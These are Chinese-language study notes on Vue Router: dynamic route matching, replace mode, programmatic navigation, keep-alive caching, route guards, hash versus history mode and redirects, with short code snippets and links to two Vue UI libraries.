### 动态路由匹配

若多个路由相同 单是数据不同时 使用动态路由性能会更优。

#### 响应路由参数的变化

复用组件时，想对路由参数的变化作出响应的话，你可以简单地 watch (监测变化) `$route` 对象：

```js
const User = {
  template: '...',
  watch: {
    $route(to, from) {
      // 对路由变化作出响应...
    }
  }
}
```

或者使用 2.2 中引入的 `beforeRouteUpdate` [导航守卫](https://router.vuejs.org/zh/guide/advanced/navigation-guards.html)：

```js
const User = {
  template: '...',
  beforeRouteUpdate(to, from, next) {
    // react to route changes...
    // don't forget to call next()
  }
}
```

### repalce

可以控制路由跳转时操作浏览器历史纪录的模式

浏览器的历史记录有两种写入方式，分别为：

1. push，push是追加历史记录（router-link默认模式）
2. replace，replace是替换当前记录

如何开启replace模式

```vue
<router-link :replae="true" ......>News</router-link> //完整写法
<router-link replace ......>News</router-link> //简写形式
```

### 编程式路由导航

可以不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

```react
//$router的两个API,可以实现路由跳转
this.$router.push({
  name:'xiangqing',
  params:{
    id:xxx,
    title:xxx
  }
})

this.$router.replace({
  name:"xiangqing",
  params:{
    id:xxx,
    title:xxx
  }
})

this.$router.back()//后退
this.$router.forward()//前进
this.$router.go()//指定前进/后退步数，正数前进，负数后退
```

### 缓存路由组件

可以让不展示的路由组件保持挂载，不被销毁（切换路由之后其他组件会被销毁）

```vue
<keep-alive include="News">
  <router-view></router-view>
</keep-alive>
```

### 两个新的生命周期钩子

路由组件所独有的两个钩子，用于捕获路由组件的激活状态。

1. activated，路由组件被激活时触发
2. deactivated，路由组件失活时触发

```react
activated() {
   console.log("News组件被激活了");
   this.timer = setInterval(() => {
      console.log("@");
      this.opacity <= 0 ? (this.opacity = 1) : (this.opacity -= 0.01);
   }, 10);
},
deactivated() {
   console.log("News组件被失活了");
   clearInterval(this.timer);
},
```

> 有三个生命周期钩子没有在生命周期图示上显示出来，只有路由才拥有的是`activated`和`deactivated`，还有一个是`$nextTick`

### 路由守卫

可以对路由进行权限控制,在跳转的时候进行一个权限的判断,符合权限的才会真正的跳转到具体的组件中

#### 全局守卫

配置在全局的路由守卫,会针对于所有的组件进行权限检测

1. to：跳转的组件
2. from：从哪个组件跳转
3. next：该函数调用之后会使路由进行下一步的跳转
   - next()第一种方式跳转，跳转到to去的路径
   - next('/path')第二种方式跳转，强制跳转到填写的路径

##### 全局前置守卫

`router.beforeEach`在切换组件之前会调用传递进去的函数，该函数可以接收到三个参数：`to、from、next`

初始化时执行、每次路由切换前执行

```javascript
router.beforeEach((to,from,next) =>{
  console.log('beforeEach阶段',to,from);
  if(to.meta.impower){
    if(localStorage.getItem('user') === "张三"){
      next()// 放行
    }else{
	 		alert('用户名错误,无权访问！')
   	}
  }else{
    next() //放行
  }
})
```

##### 全局后置守卫

`router.afterEach`在切换组件之后会调用传递进去的函数，该函数可以接收到三个参数：`to、from、next`

初始化时执行、每次路由切换后执行

```javascript
router.afterEach((to,from) => {
  console.log('afterEach阶段'，to,from);
  if(to.meta.title){
    document.title = to.meta.title; //修改网页的title
  }else{
    document.title = "人体工学系统"
  }
})
```

> meta是路由元信息，是我们程序员自己定义的一些信息，meta存在于每一个路由配置对象中

#### 独享路由守卫

使用`router.beforeEnter`可以给单独的一个路由设置守卫，独享路由守卫只可以设置前置的，没有后置

```javascript
{
   name: "xinwen",
   path: "news",
   component: News,
   meta: { impower: true, title: "新闻" },
   // #独享路由守卫(只有前置)
   beforeEnter: (to, from, next) => {
      if (to.meta.impower) {
         if (localStorage.getItem("user") === "张三") {
            next();
         } else {
            alert("用户名错误，您无权访问！");
         }
      } else {
         next();
      }
   },
},
```

> 独享路由守卫可以搭配着全局后置路由守卫使用

#### 组件路由守卫

定义在组件内的路由守卫，有2个函数，都可以接收到`to、from、next`参数

##### 进入守卫

通过路由规则，进入该组件时被调用,在组件内添加，类似于生命周期函数

```react
beforeRouteEnter(to,from,next){
  console.log('beforeRouteEnter调用了')
}
```

##### 离开守卫

通过路由规则，离开该组件时被调用

```react
beforeRouteLeave(to,from,next){
  console.log('beforeRouteLeave调用了')
}
```

### 路由器的两种工作模式

修改路由的工作模式（在router配置文件中添加该属性）

```javascript
mode:"history"
```

#### 什么是hash

url地址中，#及其后面的内容就是hash值

hash值不会包含在HTTP请求中，即：hash值不会带给服务器

```http
http://localhost/user.php?name=向军#/dskafjaksfkdsaja/sfasdfdfasf
```

#### hash

1. 地址中永远带着#号，不美观。
2. 若以后将地址通过第三方手机app分享，若app教研严格，则地址会被标记为不合法
3. 兼容性较好。

#### history

1. 地址干净、美观
2. 兼容性和`hash`模式相比略差。
3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题，hash模式则不会。

### 重定向

1. 字符串路径

```javascript
routes:[
  {
    path:'/',
    redirect:'/login'
  }
]
```

2. name

```javascript
routes:[
  {
    path:'/',
    redirect:{name:"Login"}
  }
]
```

3. 动态返回重定向目标

```javascript
routes:[
  {
    path:'/',
   	redirect:to =>{
   	  return '/login'
   	}
  }
]
```



## 组件库

定制化网站纯css写，不用组件库之类的库

组件概念是Vue、React框架之后出来的概念

### Vue移动端框架

Mint ui

网址： http://mint-ui.github.io/docs/#/zh-cn

### Vue网页端框架

element ui

网址： https://element.eleme.cn/#/zh-CN

